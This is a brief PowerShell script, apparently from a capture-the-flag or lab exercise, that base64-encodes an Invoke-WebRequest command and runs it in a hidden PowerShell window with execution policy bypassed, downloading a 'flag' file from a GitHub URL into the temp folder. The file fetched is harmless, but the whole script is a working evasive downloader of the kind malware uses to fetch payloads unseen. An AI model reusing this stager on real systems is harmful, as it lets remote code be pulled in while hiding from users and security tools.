[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 

$url = "https://raw.githubusercontent.com/jinjinir/flags/master/flag-1.txt"
$outfile = "$env:TEMP\flag.txt"

$command = "Invoke-WebRequest -Uri $url -OutFile $outfile"

$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", $encodedCommand
